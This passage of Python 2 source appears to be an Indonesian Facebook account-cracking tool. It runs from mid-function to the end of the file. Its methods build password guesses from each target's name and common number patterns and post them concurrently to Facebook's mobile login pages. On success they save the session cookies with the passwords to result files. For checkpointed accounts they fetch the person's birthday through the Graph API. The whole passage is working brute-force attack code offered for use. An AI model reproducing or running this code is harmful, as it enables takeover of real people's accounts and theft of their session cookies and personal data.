                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [Ã—] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [Ã—] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [âœ“] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [Ã—] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [Ã—] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('ALI.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [âœ“] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [Ã—] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [Ã—] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            print '\n %s[%sÃ—%s] Fill Blank Place'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] Ok Result Saved To -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] Cp result saved to -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] Turn Of Data For stop the Process\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # You don,t know why ask Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", "12341234", "12345678", "1234567890", "1234512345", xz[0]+"12345", xz[0]+"1990", xz[0]+"1234567890", xz[0]+"1991", xz[0]+"1992", xz[0]+"1993", xz[0]+"1994", xz[0]+"1995", xz[0]+"1996", xz[0]+"1997", xz[0]+"1998", xz[0]+"1999", xz[0]+"2000", xz[0]+"2001", xz[0]+"2002", xz[0]+"2003", xz[0]+"2004", xz[0]+"2005", xz[0]+"2006", xz[0]+"2007", xz[0]+"2008", xz[0]+"2009", xz[0]+"12345678", xz[0]+"1234567890", xz[0]+"123456789"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", "12341234", "12345678", "1234567890", "1234512345", xz[0]+"12345", xz[0]+"1990", xz[0]+"1234567890", xz[0]+"1991", xz[0]+"1992", xz[0]+"1993", xz[0]+"1994", xz[0]+"1995", xz[0]+"1996", xz[0]+"1997", xz[0]+"1998", xz[0]+"1999", xz[0]+"2000", xz[0]+"2001", xz[0]+"2002", xz[0]+"2003", xz[0]+"2004", xz[0]+"2005", xz[0]+"2006", xz[0]+"2007", xz[0]+"2008", xz[0]+"2009", xz[0]+"12345678", xz[0]+"1234567890", xz[0]+"123456789"]
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            print '\n [%s+%s] Ok result save in -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] Cp result save in -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] Turn Of data for stop the process\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # You do not know why ask Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", "12341234", "12345678", "1234567890", "1234512345", xz[0]+"12345", xz[0]+"1990", xz[0]+"1234567890", xz[0]+"1991", xz[0]+"1992", xz[0]+"1993", xz[0]+"1994", xz[0]+"1995", xz[0]+"1996", xz[0]+"1997", xz[0]+"1998", xz[0]+"1999", xz[0]+"2000", xz[0]+"2001", xz[0]+"2002", xz[0]+"2003", xz[0]+"2004", xz[0]+"2005", xz[0]+"2006", xz[0]+"2007", xz[0]+"2008", xz[0]+"2009", xz[0]+"12345678", xz[0]+"1234567890", xz[0]+"123456789"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", "12341234", "12345678", "1234567890", "1234512345", xz[0]+"12345", xz[0]+"1990", xz[0]+"1234567890", xz[0]+"1991", xz[0]+"1992", xz[0]+"1993", xz[0]+"1994", xz[0]+"1995", xz[0]+"1996", xz[0]+"1997", xz[0]+"1998", xz[0]+"1999", xz[0]+"2000", xz[0]+"2001", xz[0]+"2002", xz[0]+"2003", xz[0]+"2004", xz[0]+"2005", xz[0]+"2006", xz[0]+"2007", xz[0]+"2008", xz[0]+"2009", xz[0]+"12345678", xz[0]+"1234567890", xz[0]+"123456789"]
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            print '\n [%s+%s] Ok result save in -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] Cp result save in -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] Turn of data for stop the process\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # You do not know why ask Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", "12341234", "12345678", "1234567890", "1234512345", xz[0]+"12345", xz[0]+"1990", xz[0]+"1234567890", xz[0]+"1991", xz[0]+"1992", xz[0]+"1993", xz[0]+"1994", xz[0]+"1995", xz[0]+"1996", xz[0]+"1997", xz[0]+"1998", xz[0]+"1999", xz[0]+"2000", xz[0]+"2001", xz[0]+"2002", xz[0]+"2003", xz[0]+"2004", xz[0]+"2005", xz[0]+"2006", xz[0]+"2007", xz[0]+"2008", xz[0]+"2009", xz[0]+"12345678", xz[0]+"1234567890", xz[0]+"123456789"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", "12341234", "12345678", "1234567890", "1234512345", xz[0]+"12345", xz[0]+"1990", xz[0]+"1234567890", xz[0]+"1991", xz[0]+"1992", xz[0]+"1993", xz[0]+"1994", xz[0]+"1995", xz[0]+"1996", xz[0]+"1997", xz[0]+"1998", xz[0]+"1999", xz[0]+"2000", xz[0]+"2001", xz[0]+"2002", xz[0]+"2003", xz[0]+"2004", xz[0]+"2005", xz[0]+"2006", xz[0]+"2007", xz[0]+"2008", xz[0]+"2009", xz[0]+"12345678", xz[0]+"1234567890", xz[0]+"123456789"]
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            print '\n %s[%sÃ—%s] Input Correct'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
